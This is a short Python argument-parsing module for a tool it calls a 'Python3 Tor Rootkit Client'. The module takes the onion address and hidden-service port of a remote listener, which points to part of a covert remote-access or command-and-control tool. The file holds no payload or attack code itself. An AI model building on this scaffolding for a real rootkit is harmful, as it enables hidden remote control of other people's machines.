from argparse import ArgumentParser


def parse():
	parser = ArgumentParser(description='Python3 Tor Rootkit Client')
	parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
	parser.add_argument('port', type=int, help='The remote hidden service port of the listener.')
	args = parser.parse_args()
	return args.onion, args.port